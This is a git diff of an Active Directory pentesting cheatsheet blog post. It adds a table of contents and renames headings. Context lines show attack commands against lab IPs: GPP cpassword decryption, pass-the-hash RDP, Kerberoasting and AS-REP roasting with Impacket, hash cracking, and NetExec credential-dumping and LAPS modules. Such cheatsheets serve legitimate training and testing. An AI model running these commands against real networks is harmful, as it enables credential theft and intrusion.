@@ -6,6 +6,33 @@ date:   2024-11-01 01:00:00 +0300
 image:  '/images/10000.jpg'
 tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB, Kerberoasting, AS-REP-Roasting, DCSync, Silver-Ticket, ACLs, MSSQL, Credential-Dumping, Credential-Hunting]
 ---
+# Table of Contents
+
+- [Identify the Domain Controller](#identify-the-domain-controller)
+- [Uncredentialed Enumeration and Attacks](#uncredentialed-enumeration-and-attacks)
+- [Domain Password Policy Enumeration](#domain-password-policy-enumeration)
+- [Domain and Local User Enumeration](#domain-and-local-user-enumeration)
+- [Domain and Local Group Enumeration](#domain-and-local-group-enumeration)
+- [SMB Shares Credentialed Access and Enumeration](#smb-shares-credentialed-access-and-enumeration)
+- [RPC Credentialed Access and Enumeration](#rpc-credentialed-access-and-enumeration)
+- [GPP cpassword](#gpp-cpassword)
+- [Password Spraying with Kerbrute, NetExec and CrackMapExec](#password-spraying-with-kerbrute-netexec-and-crackmapexec)
+- [Runas and RunasCs.exe](#runas-and-runascsexe)
+- [BloodHound, SharpHound.exe, bloodhound-python](#bloodhound-sharphoundexe-bloodhound-python)
+- [PowerView.ps1](#powerviewps1)
+- [Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash](#impacket-psexec-wmiexec-and-smbexec---smb-shell-access-with-password-or-pass-the-hash)
+- [Evil-WinRM - Access WinRM with Password or Pass-the-Hash](#evil-winrm---access-winrm-with-password-or-pass-the-hash)
+- [xfreerdp - Access RDP with Password or Pass-the-Hash](#xfreerdp---access-rdp-with-password-or-pass-the-hash)
+- [Kerberoasting with Impacket-GetUserSPNs](#kerberoasting-with-impacket-getuserspns)
+- [Kerberoasting with Rubeus.exe](#kerberoasting-with-rubeusexe)
+- [AS-REP Roasting with Impacket-GetNPUsers](#as-rep-roasting-with-impacket-getnpusers)
+- [DCSync with Impacket-secretsdump](#dcsync-with-impacket-secretsdump)
+- [Remote Credential Dumping with Impacket-secretsdump and NetExec](#remote-credential-dumping-with-impacket-secretsdump-and-netexec)
+- [Local Credential Dumping with Mimikatz and Impacket-secretsdump](#local-credential-dumping-with-mimikatz-and-impacket-secretsdump)
+- [Silver Ticket](#silver-ticket)
+- [ACLs](#acls)
+- [MSSQL to gain Shell Access](#mssql-to-gain-shell-access)
+
 ### Identify the Domain Controller
 ```shell
 # Using NetExec and CrackMapExec (Examine results for a host like DC01, for example)
@@ -215,7 +242,7 @@ sudo apt install gpp-decrypt
 gpp-decrypt F7HV9AXdOSpNAXTDhwZt0atMg6S/Q0TOnyGDYMIzL7o ​
 # This will give us the credentials for the user the Groups.xml is related to
 ```
-### Password Spraying
+### Password Spraying with Kerbrute, NetExec and CrackMapExec
 ```shell
 # kerbrute.py
 git clone https://github.com/TarlogicSecurity/kerbrute.git
@@ -406,7 +433,7 @@ xfreerdp /cert-ignore /auto-reconnect /h:1000 /w:1600 /v:172.16.150.10 /u:Admini
 # Using hash
 xfreerdp /u:Administrator /pth:'1a06b4248879e68a498d3bac51bf91c9' /v:172.16.150.10 /drive:share,/home/kali/share
 ```
-### Kerberoasting with Impacket
+### Kerberoasting with Impacket-GetUserSPNs
 ```shell
 # Using john to obtain the hash of jane
 impacket-GetUserSPNs -dc-ip 172.16.150.10 vorkharium.com/john -request-user jane
@@ -429,7 +456,7 @@ sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
 sudo john jane_hash.txt --show
 
 ```
-### AS-REP Roasting with Impacket
+### AS-REP Roasting with Impacket-GetNPUsers
 ```shell
 # AS-REP Roasting without password
 impacket-GetNPUsers vorkharium.com/john -dc-ip 172.16.150.10 -request -no-pass
@@ -446,10 +473,10 @@ hashcat -m 18200 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlist
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
 sudo john jane_hash.txt --show
 ```
-### DCSync with Impacket
+### DCSync with Impacket-secretsdump
 ```shell
 ```
-### Remote Credential Dumping with Impacket and NetExec
+### Remote Credential Dumping with Impacket-secretsdump and NetExec
 ```shell
 # Using Impacket
 # With password
@@ -485,7 +512,7 @@ nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump
 # LAPS Password
 nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.120
 ```
-### Local Credential Dumping with Mimikatz and Impacket
+### Local Credential Dumping with Mimikatz and Impacket-secretsdump
 ```shell
 # Mimikatz.exe
 # Important Note: mimikatz.exe wont work from the evil-winrm console. Use nc to get shell instead
@@ -543,7 +570,7 @@ Comming soon.
 ```shell
 Comming soon.
 ```
-### MSSQL to gain Shell
+### MSSQL to gain Shell Access
 ```shell
 Comming soon.
 ```
